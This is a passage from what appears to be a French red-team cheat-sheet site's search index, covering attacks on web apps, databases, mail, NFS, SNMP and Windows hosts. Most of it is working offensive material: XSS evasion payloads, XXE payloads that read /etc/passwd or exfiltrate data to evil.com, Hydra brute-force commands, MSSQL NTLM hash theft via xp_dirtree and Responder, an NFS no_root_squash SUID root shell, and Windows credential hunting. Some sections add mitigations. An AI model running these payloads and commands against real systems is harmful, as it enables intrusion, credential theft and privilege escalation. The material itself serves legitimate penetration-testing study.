<pre><code>$comment = filter_input(INPUT_POST, 'comment', FILTER_SANITIZE_STRING);\n</code></pre> Cat\u00e9gorie Information TTP Injection de scripts c\u00f4t\u00e9 client dans des pages web CWE CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')) Description de l'attaque XSS se produit lorsque des scripts malveillants sont inject\u00e9s dans des sites web de confiance. Ces scripts sont ex\u00e9cut\u00e9s dans le navigateur de l'utilisateur et peuvent d\u00e9tourner des sessions, d\u00e9facer des sites web, ou rediriger l'utilisateur vers des sites malveillants. Impacts potentiels - D\u00e9tournement de session- Vol d'informations sensibles- Manipulation de contenu web pour l'utilisateur Comment la d\u00e9tecter - Utilisation de scanners de vuln\u00e9rabilit\u00e9s web- Analyse des entr\u00e9es et sorties des applications web- Tests de p\u00e9n\u00e9tration ciblant les scripts c\u00f4t\u00e9 client Rem\u00e9diations/mitigations - \u00c9chappement des entr\u00e9es utilisateur dans les sorties HTML/JavaScript- Utilisation de politiques de s\u00e9curit\u00e9 de contenu (CSP)- Validation et nettoyage des entr\u00e9es c\u00f4t\u00e9 serveur- Formation des d\u00e9veloppeurs aux pratiques de codage s\u00e9curis\u00e9 Lien de r\u00e9f\u00e9rence OWASP - Cross Site Scripting (XSS)"},{"location":"Red%20Team/Services/HTTP/XSS/Payloads/","title":"Payloads","text":"<pre><code>// Basic payload\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n\"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n&lt;script&gt;\\u0061lert('22')&lt;/script&gt;\n&lt;script&gt;eval('\\x61lert(\\'33\\')')&lt;/script&gt;\n&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(\"confirm\",30) == 8680439 &amp;&amp; 8680439..toString(30) == \"confirm\"\n&lt;object/data=\"jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;\"&gt;\n\n// Img payload\n&lt;img src=x onerror=alert('XSS');&gt;\n&lt;img src=x onerror=alert('XSS')//\n&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;\n\"&gt;&lt;img src=x onerror=alert('XSS');&gt;\n\"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;\n\n// Svg payload\n&lt;svg\fonload=alert(1)&gt;\n&lt;svg/onload=alert('XSS')&gt;\n&lt;svg onload=alert(1)//\n&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n&lt;svg id=alert(1) onload=eval(id)&gt;\n\"&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n\"&gt;&lt;svg/onload=alert(/XSS/)\n&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;(`Firefox` is the only browser which allows self closing script)\n&lt;svg&gt;&lt;script&gt;alert('33')\n&lt;svg&gt;&lt;script&gt;alert&amp;lpar;'33'&amp;rpar;\n\n// Div payload\n&lt;div onpointerover=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerdown=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerenter=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerleave=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointermove=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerout=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerup=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'XML External Entity (XXE) se produisent lorsqu'une application XML permet \u00e0 un attaquant d'inclure des entit\u00e9s externes malveillantes ou des r\u00e9f\u00e9rences \u00e0 des ressources externes non s\u00e9curis\u00e9es dans un document XML. Cela peut entra\u00eener la divulgation de donn\u00e9es sensibles, le d\u00e9ni de service, voire l'ex\u00e9cution de code \u00e0 distance.</p>"},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#types-dattaques-xxe","title":"Types d'Attaques XXE","text":"<p>XXE Basique :</p> <ul> <li>Se produit lorsque l'application XML traite les entit\u00e9s externes sans validation ou protection ad\u00e9quates.</li> </ul> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <ul> <li>Cette attaque r\u00e9cup\u00e8re le contenu du fichier <code>/etc/passwd</code>.</li> </ul> <p>XXE Out-Of-Band (OOB) :</p> <ul> <li>Se produit lorsque l'attaquant utilise l'entit\u00e9 externe pour initier une connexion sortante vers un serveur contr\u00f4l\u00e9 par lui.</li> </ul> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"&gt;\n%xxe;\n]&gt;\n&lt;foo&gt;&amp;all;&lt;/foo&gt;\n</code></pre> <ul> <li>Cette attaque peut \u00eatre utilis\u00e9e pour exfiltrer des donn\u00e9es vers un serveur contr\u00f4l\u00e9 par l'attaquant.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-xxe","title":"Pr\u00e9vention des Attaques XXE","text":"<p>D\u00e9sactivation du Parsing des DTD :</p> <ul> <li>D\u00e9sactiver le parsing des DTD (Document Type Definitions) dans les biblioth\u00e8ques XML.</li> </ul> <p>Validation des Entr\u00e9es XML :</p> <ul> <li>Valider et restreindre les entr\u00e9es XML pour s'assurer qu'elles ne contiennent pas d'entit\u00e9s externes malveillantes.</li> </ul> <p>Utilisation de M\u00e9thodes S\u00e9curis\u00e9es :</p> <ul> <li>Utiliser des m\u00e9thodes s\u00e9curis\u00e9es pour le traitement des documents XML, telles que DOM s\u00e9curis\u00e9 ou SAX avec les entit\u00e9s externes d\u00e9sactiv\u00e9es.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-xxe","title":"D\u00e9tection des Failles XXE","text":"<p>Analyse de la Configuration :</p> <ul> <li>Examiner la configuration XML pour v\u00e9rifier si le parsing des DTD est activ\u00e9.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en injectant des payloads XXE et en observant les r\u00e9ponses de l'application.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles XXE.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>D\u00e9sactivation des DTD dans Java :</p> <pre><code>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n</code></pre> <p>Utilisation de SAXParser avec les Entit\u00e9s Externes D\u00e9sactiv\u00e9es :</p> <pre><code>SAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nSAXParser parser = factory.newSAXParser();\n</code></pre> Cat\u00e9gorie Information TTP Exploitation des r\u00e9f\u00e9rences d'entit\u00e9s externes dans XML CWE CWE-611 (Improper Restriction of XML External Entity Reference) Description de l'attaque Une attaque XXE se produit lorsqu'un attaquant exploite des applications qui analysent XML de mani\u00e8re \u00e0 injecter des r\u00e9f\u00e9rences \u00e0 des entit\u00e9s externes malveillantes. Cela peut mener \u00e0 la divulgation d'informations confidentielles, au d\u00e9ni de service, ou \u00e0 l'ex\u00e9cution de code \u00e0 distance. Impacts potentiels - Divulgation d'informations sensibles- D\u00e9ni de service- Ex\u00e9cution de code \u00e0 distance- Porte d\u00e9rob\u00e9e dans les syst\u00e8mes Comment la d\u00e9tecter - Analyse de code statique et dynamique- Utilisation de scanners de vuln\u00e9rabilit\u00e9- Tests de p\u00e9n\u00e9tration ciblant les fonctionnalit\u00e9s de traitement XML Rem\u00e9diations/mitigations - D\u00e9sactivation du traitement des entit\u00e9s externes dans les parseurs XML- Validation et nettoyage des entr\u00e9es XML- Utilisation de listes blanches pour les \u00e9l\u00e9ments XML trait\u00e9s- Mise \u00e0 jour r\u00e9guli\u00e8re des biblioth\u00e8ques et frameworks XML Lien de r\u00e9f\u00e9rence OWASP - XML External Entity (XXE) Processing"},{"location":"Red%20Team/Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Base de donn\u00e9es SQL, port 3306, TCP</p>"},{"location":"Red%20Team/Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\n</code></pre>"},{"location":"Red%20Team/Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip mssql\n</code></pre>"},{"location":"Red%20Team/Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/admin/mssql/mssql_ntlm_stealer\nadmin/mssql/mssql_enum\nadmin/mssql/mssql_enum_domain_accounts\nadmin/mssql/mssql_enum_sql_logins\nauxiliary/admin/mssql/mssql_findandsampledata\nauxiliary/scanner/mssql/mssql_hashdump\nauxiliary/scanner/mssql/mssql_schemadump\n</code></pre>"},{"location":"Red%20Team/Services/MSSQL/Relais%20NTLM/","title":"Relais NTLM","text":"<p>Une fois connect\u00e9 sur un serveur MSSQL il peut \u00eatre possible d'acc\u00e9der \u00e0 un partage SMB via la commande xp_dirtree / xp_subdir / xp_fileexist, ce qui peut possiblement permettre de r\u00e9cup\u00e9rer le hash de l'utilisateur:</p> <p>Sur le poste attaquant:</p> <pre><code>sudo responder -I tun0\n</code></pre> <p>Sur MSSQL:</p> <pre><code>xp_dirtree '\\\\$ip$\\fauxpartage'\nexec master.dbo.xp_dirtree '\\\\$ip$\\fauxpartage'\nEXEC master..xp_subdirs '\\\\$ip$\\fauxpartage'\nEXEC master..xp_fileexist '\\\\$ip$\\fauxpartage'\n</code></pre>"},{"location":"Red%20Team/Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Base de donn\u00e9es SQL, port 3306, TCP</p>"},{"location":"Red%20Team/Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip \n</code></pre>"},{"location":"Red%20Team/Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip mysql\n</code></pre>"},{"location":"Red%20Team/Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/scanner/mysql/mysql_version\nauxiliary/scanner/mysql/mysql_authbypass_hashdump\nauxiliary/scanner/mysql/mysql_hashdump \nauxiliary/admin/mysql/mysql_enum \nauxiliary/scanner/mysql/mysql_schemadump  \nexploit/windows/mysql/mysql_start_up \n</code></pre> <p>Brute force user/password:</p> <pre><code>auxiliary/scanner/mysql/mysql_login\n</code></pre>"},{"location":"Red%20Team/Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Settings Description user Sets which user the MySQL service will run as. password Sets the password for the MySQL user. admin_address The IP address on which to listen for TCP/IP connections on the administrative network interface. debug This variable indicates the current debugging settings sql_warnings This variable controls whether single-row INSERT statements produce an information string if warnings occur. secure_file_priv This variable is used to limit the effect of data import and export operations."},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Network FileSystem, port 2049, TCP/UDP Permet le partage de dossiers/fichiers \u00e0 travers un r\u00e9seau.</p> Version Features NFSv2 It is older but is supported by many systems and was initially operated entirely over UDP. NFSv3 It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients. NFSv4 It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol."},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#nmap","title":"Nmap:","text":"<pre><code>nmap -A --script nfs* $ip \n</code></pre>"},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#lister-les-partages","title":"Lister les partages:","text":"<pre><code>showmount -e $ip\n</code></pre>"},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#monter-un-partage","title":"Monter un partage:","text":"<pre><code>mkdir nfs_temp\nmount -t nfs $ip:/dossierPartag\u00e9 nfs_temp -o nolock\n</code></pre>"},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":""},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#scan","title":"Scan:","text":"<pre><code>scanner/nfs/nfsmount\n</code></pre>"},{"location":"Red%20Team/Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Option Description rw Permission lecture et \u00e9criture insecure Utilisations de ports en dessous 1024 nohide If another file system was mounted below an exported directory, this directory is exported by its own exports entry. no_root_squash All files created by root are kept with the UID/GID 0."},{"location":"Red%20Team/Services/NFS/nfs-no-root-squashfs/","title":"Nfs no root squashfs","text":"<p>Si un volume est mont\u00e9 en NFS avec l'option \"no_root_squashfs\", alors ce sont les droits de l'utilisateur qui monte ce fichier \u00e0 distance qui s'appliquent. Exemple, un serveur a un partage disponible avec cette option activ\u00e9e, si je le monte avec l'utilisateur root de mon host, alors j'ai les droits root sur ce partage \u00e9galement. Le principe est ensuite d'uploader un binaire avec un SUID, pour pouvoir faire une privesc.</p> <p>machine cible: <pre><code>cat /etc/exports\n---\n/var/nfs/general *(rw,no_root_squash)\n/tmp *(rw,no_root_squash)\n</code></pre></p> <p>Cr\u00e9ation d'un binaire:</p> <pre><code>nano -w shell.c\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nint main(void)\n{\n  setuid(0); setgid(0); system(\"/bin/bash\");\n}\n--------------------------------\ngcc shell.c -o shell\n</code></pre> <p>Le copier sur la machine cible, puis lui donner le suid:</p> <pre><code>machine host:\nsudo mount -t nfs 10.129.2.12:/tmp /mnt\nsudo cp shell /mnt/\nsudo chmod u+s /mnt/shell\n</code></pre> <p>Puis ex\u00e9cuter le binaire sur la machine cible:</p> <pre><code>/tmp/bash -p\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Post Office Protocol, port 110/995, TCP. Internet Message Access Protocol, port 143/993, TCP.</p> <p>Possible de se connecter directement via telnet. </p>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#commandes-disponibles-imap","title":"Commandes disponibles (IMAP):","text":"Command Description 1 LOGIN username password User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed. 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH all Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server."},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#commandes-disponibles-pop3","title":"Commandes disponibles (POP3):","text":"Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server."},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":""},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-via-telnet","title":"Connection via telnet:","text":"<pre><code>nc -nv $ip 143\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#connction-pop3-via-openssl","title":"Connction POP3 via openssl:","text":"<pre><code>openssl s_client -connect $ip:pop3s\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-imap-via-openssl","title":"Connection IMAP via openssl:","text":"<pre><code>openssl s_client -connect $ip:imaps\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#nmap","title":"Nmap:","text":"<pre><code>nmap $ip -sV -p110,143,993,995 -sC\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#lister-les-mailbox-dun-user","title":"Lister les mailbox d'un user:","text":"<pre><code>curl -k 'imaps://$ip' --user user:password\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#lister-les-messages-dans-une-mailbox","title":"Lister les messages dans une mailbox:","text":"<pre><code>curl -k 'imaps://$ip/INBOX?ALL' --user user:password\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#voir-le-contenu-dun-message-ici-le-premier-mail-dans-la-mailbox-drafts","title":"Voir le contenu d'un message (ici le premier mail dans la mailbox \"Drafts\"):","text":"<pre><code>curl -k 'imaps://$ip/Drafts;MAILINDEX=1' --user user:pass\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":""},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-password-pop3","title":"Brute force password pop3:","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -f $ip pop3 -V\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-password-imap","title":"Brute force password imap:","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -f $ip imap -V\n</code></pre>"},{"location":"Red%20Team/Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Setting Description auth_debug Enables all authentication debug logging. auth_debug_passwords This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. auth_verbose Logs unsuccessful authentication attempts and their reasons. auth_verbose_passwords Passwords used for authentication are logged and can also be truncated. auth_anonymous_username This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism."},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Simple Mail Transfer Protocol, port 25/587, TCP Envoie/r\u00e9ception de mails, sans utilisation de STARTTLS les informations transitent en clair sur le r\u00e9seau. Client (MUA) \u279e Submission Agent (MSA) \u279e Open</p> <p>Il est possible d'utiliser SMTP en se connectant directement en telnet sur le port 25, les commandes disponibles sont:</p> Command Description AUTH PLAIN AUTH is a service extension used to authenticate the client. HELO The client logs in with its computer name and thus starts the session. MAIL FROM The client names the email sender. RCPT TO The client names the email recipient. DATA The client initiates the transmission of the email. RSET The client aborts the initiated transmission but keeps the connection between client and server. VRFY The client checks if a mailbox is available for message transfer. EXPN The client also checks if a mailbox is available for messaging with this command. NOOP The client requests a response from the server to prevent disconnection due to time-out. QUIT The client terminates the session."},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":""},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-telnet","title":"Connection telnet:","text":"<pre><code>nc -vn $ip 25\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-openssl-si-utilisation-de-starttls","title":"Connection openssl (si utilisation de starttls):","text":"<pre><code>openssl s_client -starttls smtp -crlf -connect $domain:587\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#savoir-si-le-serveur-peut-etre-utilise-comme-open-relay","title":"Savoir si le serveur peut \u00eatre utilis\u00e9 comme open relay:","text":"<pre><code>sudo nmap $ip -p25 --script smtp-open-relay -v\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#connaitre-les-differentes-commandes-pourvant-etre-utilisees","title":"Conna\u00eetre les diff\u00e9rentes commandes pourvant \u00eatre utilis\u00e9es:","text":"<pre><code>nmap -p25 --script smtp-commands $ip\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":""},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-des-users","title":"Brute force des users:","text":"<pre><code>nmap --script smtp-enum-users $ip\n</code></pre> <pre><code>smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t $ip\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-password","title":"Brute force password:","text":"<pre><code>hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip smtp\n</code></pre>"},{"location":"Red%20Team/Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/scanner/smtp/smtp_enum\n</code></pre>"},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Simple Network Management Protocol, port 161, UDP Monitoring des \u00e9quipements r\u00e9seaux, peut aussi \u00eatre utilis\u00e9 pour faire de la configuration \u00e0 distance. </p>"},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":""},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#snmpwalk","title":"SnmpWalk:","text":"<pre><code>snmpwalk -v2c -c $CommunityString $ip\n</code></pre>"},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":""},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-de-la-community-string","title":"Brute force de la community string:","text":"<pre><code>onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt $ip\n</code></pre>"},{"location":"Red%20Team/Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Settings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 Same access as with rwcommunity with the difference of using IPv6."},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/","title":"Enum\u00e9ration locale","text":""},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#identifier-des-problemes-de-permissions-sur-des-services","title":"Identifier des probl\u00e8mes de permissions sur des services","text":"<pre><code>.\\SharpUp.exe audit\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#winpeas","title":"Winpeas","text":"<pre><code>.\\WinPeas.exe\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#voir-le-statut-de-windows-defender","title":"Voir le statut de Windows Defender","text":"<pre><code>Get-MpComputerStatus\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lister-les-regles-applocker","title":"Lister les r\u00e8gles AppLocker","text":"<pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#savoir-si-powershell-est-en-constrained-language-mode-ou-en-full-language-mode","title":"Savoir si powershell est en \"Constrained Language Mode\" ou en \"Full language Mode\"","text":"<pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre> <p>[!Attention] Le mode \"constrained\" va emp\u00eacher l'utilisation de certaines features de powershell.</p>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#liste-les-process-en-cours","title":"Liste les process en cours","text":"<pre><code>tasklist /svc\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#enumerer-les-variables-denvironnement","title":"\u00c9num\u00e9rer les variables d'environnement","text":"<pre><code>set\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#enumerer-les-informations-systeme","title":"\u00c9num\u00e9rer les informations syst\u00e8me","text":"<pre><code>systeminfo\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#enumerer-les-differents-patchsupdates-appliques","title":"\u00c9num\u00e9rer les diff\u00e9rents patchs/updates appliqu\u00e9s","text":"<pre><code>wmic qfe\nou\nGet-HotFix | ft -AutoSize\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lister-les-programmes-installes","title":"Lister les programmes install\u00e9s","text":"<pre><code>wmic product get name\nou\nGet-WmiObject -Class Win32_Product |  select Name, Version\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lister-les-services-reseaux","title":"Lister les services r\u00e9seaux","text":"<pre><code>netstat -ano\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lister-les-users-logges","title":"Lister les users logg\u00e9s","text":"<pre><code>query user\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#enumerer-les-comptes-utilisateur-et-les-groupes","title":"\u00c9num\u00e9rer les comptes utilisateur et les groupes","text":"<pre><code>net user\nnet localgroupe\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lister-les-informations-a-propos-dun-groupe-en-particulier","title":"Lister les informations \u00e0 propos d'un groupe en particulier","text":"<pre><code>net localgroup $group\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#creds-hunting","title":"Creds hunting","text":"<pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.bak\n</code></pre> <pre><code>gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password\n</code></pre> <pre><code>gci -Path . -recurse -ea SilentlyContinue -Include *.ini,*.cfg,*.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#lire-historique-powershell","title":"Lire historique powershell","text":"<pre><code>gc (Get-PSReadLineOption).HistorySavePath\n</code></pre>"},{"location":"Red%20Team/Windows/Enum%C3%A9ration%20locale/#tenter-de-lire-celui-de-tout-les-utilisateurs","title":"Tenter de lire celui de tout les utilisateurs","text":"<pre><code>foreach($user in ((ls 